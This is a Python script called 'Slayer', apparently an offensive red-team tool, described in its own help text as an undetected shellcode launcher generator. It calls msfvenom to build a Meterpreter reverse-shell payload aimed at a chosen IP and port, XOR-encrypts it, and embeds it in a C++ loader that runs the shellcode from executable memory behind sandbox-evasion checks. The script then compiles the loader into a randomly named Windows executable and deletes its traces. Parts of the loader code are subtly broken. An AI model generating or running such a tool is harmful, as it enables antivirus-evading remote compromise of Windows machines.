#!/usr/bin/env python3
import sys
import random
import string
import os
import time
import argparse


def get_random_string():
    length = random.randint(5, 35)
    result_str = ''.join(random.choice(string.ascii_letters) for i in range(length))
    return result_str


def xor(data, key):
    output_str = ""

    for i in range(len(data)):
        current = data[i]
        current_key = key[i % len(key)]
        o = lambda x: x if isinstance(x, int) else ord(x)
        output_str += chr(o(current) ^ ord(current_key))

    ciphertext = '{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in output_str) + ' };'
    return ciphertext


def create_template():
    template = open("template.cpp", "w+")
    template.write(
    r'''#include <windows.h>
#include <stdio.h>
#include <iostream>
#define MULTI_LINE_STRING(a) #a
#pragma comment(linker, "/INCREMENTAL:YES")
#pragma comment(lib, "user32.lib")
#define WIN32_LEAN_AND_MEAN
#define MAX_BUFFER_SIZE 512
#define SECURITY_WIN32
#define __WIN32_WINNT 0x0A00
#include <secext.h>
#include <security.h>

#define UNICODE



BOOL Isdomainjoined(LPCWSTR domain) {
         WCHAR buffer[MAX_BUFFER_SIZE];
     BOOL bResult = FALSE;
    DWORD dwSize = MAX_BUFFER_SIZE;
    WCHAR* position = wcsstr(buffer, L"\\");

    position[0] = 0x00;
    if (wcscmp(domain, buffer) == 0) {
        bResult = TRUE;
    }

    return bResult;
}

int main(int argc, char** argv)
{

    if (!Isdomainjoined(L"//CHANGETHISFORDOMAIN")) {
    }
    else {

        ULONGLONG uptime = GetTickCount() / 1000;
        if (uptime < 1200) return false;

        unsigned char buf[] = " ";
        char key[] = " ";
        char shellcode[sizeof buf];
        int j = 0;
        for (int i = 0; i < sizeof buf; i++)
        {
            if (j == sizeof key - 1) j = 0;
            shellcode[i] = buf[i] ^ key[j];
            j++;
        }

        void* bigedrenergy = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        memcpy(bigedrenergy, shellcode, sizeof shellcode);
        ((void(*)())bigedrenergy)();
        return 0;
    }
}
''')
    template.close()


def slayer(payload_type, ip, port, arch):
    xorkey = get_random_string()
    buf = get_random_string()
    shellcode = get_random_string()
    monitorinfo = get_random_string()
    systemInfo = get_random_string()
    print("[*] Generating code...")
    create_template()
    time.sleep(1)
    venom = f"msfvenom -a {arch} --platform Windows -p windows/x64/meterpreter/reverse_{payload_type} LHOST={ip} LPORT={port} -f raw -o shellcode.raw"
    print(venom)
    os.system(venom)
    print("[*] Generating payload...")
    time.sleep(5)
    try:
        plaintext = open("shellcode.raw", "rb").read()
    except:
        print("[*] Failed to read shellcode.raw :(")
        print("[*] Missing shellcode.raw in pwd?")
        sys.exit(1)
    ciphertext = xor(plaintext, xorkey)
    template = open("template.cpp", "rt")
    data = template.read()
    time.sleep(1)
    data = data.replace('unsigned char buf[] = " ";', "unsigned char buf[] = " + ciphertext + " ")
    data = data.replace('char key[] = " "','char key[] = "' + xorkey + '"')
    data = data.replace("key", xorkey)
    data = data.replace("shellcode", shellcode)

    template.close()
    template = open("slayer.cpp", "w+")
    template.write(data)
    time.sleep(1)

    template.close

banner ='''
											     uu$$$$$$$$$$$uu
											  uu$$$$$$$$$$$$$$$$$uu
											 u$$$$$$$$$$$$$$$$$$$$$u
											u$$$$$$$$$$$$$$$$$$$$$$$u
										       u$$$$$$$$$$$$$$$$$$$$$$$$$u
										       u$$$$$$$$$$$$$$$$$$$$$$$$$u
										       u$$$$$$"   "$$$"   "$$$$$$u
										       "$$$$"      u$u       $$$$"
											$$$u       u$u       u$$$
											$$$u      u$$$u      u$$$
											 "$$$$uu$$$   $$$uu$$$$"
											  "$$$$$$$"   "$$$$$$$"
											    u$$$$$$$u$$$$$$$u
											     u$"$"$"$"$"$"$u
										  uuu        $$u$ $ $ $ $u$$       uuu
										 u$$$$        $$$$$u$u$u$$$       u$$$$
										  $$$$$uu      "$$$$$$$$$"     uu$$$$$$
										u$$$$$$$$$$$uu    """""    uuuu$$$$$$$$$$
										$$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"
										 """      ""$$$$$$$$$$$uu ""$"""
											   uuuu ""$$$$$$$$$$uuu
										  u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$
										  $$$$$$$$$$""""           ""$$$$$$$$$$$"
										   "$$$$$"                      ""$$$$""
										     $$$"                         $$$$"


										      Mert Umut : @twitter.com/whoismept
									              Mert Daş  : @twitter.com/merterpreter

'''

def main():
    print(banner)
    print("Additional options: -t for payload, -a for architecture, -p for port number, -i for IP address\n")
    parser = argparse.ArgumentParser(description="Slayer: Undetected shellcode launcher generator, an AV Slayer..", 
    usage="slayer.py -t payload type -i IP address -p port number -a architecture \nExample: slayer.py -P windows/x64/meterpreter/reverse_tcp -i eth0 interface -p 4444 -a x64\n")
    parser.add_argument('-t', '--type', help="Define connection type eg. reverse_tcp, reverse_https, reverse_http", type=str, default="tcp")
    parser.add_argument('-i', '--ip', help="IP address for payload", type=str, default="eth0")
    parser.add_argument('-p', '--port', help="Port for payload", type=str, default=443)
    parser.add_argument('-a', '--arch', help="Architecture for payload", type=str, default="x64")
    args = parser.parse_args()
    try:
        slayer(args.type,args.ip, args.port, args.arch)
        print("[*] Initialising slayer()")
    except:
        print("[*] slayer() failed? :(")
        sys.exit(1)

    print("[+] Compiling...")
    application_name = get_random_string()
    os.system(f"x86_64-w64-mingw32-g++ -o {application_name}.exe slayer.cpp -static-libstdc++ -static-libgcc")
    time.sleep(1)
    os.system("rm -rf slayer.cpp template.cpp shellcode.raw")
    time.sleep(1)
    print("[*] Done :)")
    print(f"[*] {application_name}.exe generated")

if __name__ == "__main__":
    main()
